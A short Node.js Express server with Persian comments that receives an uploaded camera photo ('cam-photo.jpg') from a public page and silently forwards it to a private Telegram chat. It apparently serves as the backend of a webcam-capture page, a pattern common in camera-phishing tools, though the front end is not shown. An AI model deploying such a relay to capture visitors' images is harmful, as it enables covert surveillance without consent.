const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');

const app = express();

// --- اطلاعات خودت ---
const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توکن را اینجا بگذار
const CHAT_ID = 'YOUR_CHAT_ID';     // آیدی عددی را اینجا بگذار
// --------------------

// استفاده از حافظه رم به جای پوشه (مخصوص Vercel)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/send-photo', upload.single('photo'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });

    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        // نکته مهم: وقتی از بافر (رم) می‌فرستیم باید اسم فایل را دستی ست کنیم
        form.append('photo', req.file.buffer, { filename: 'cam-photo.jpg' });
        form.append('disable_notification', 'true');

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        res.json({ success: true });

    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// پورت را خود Vercel تعیین می‌کند
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});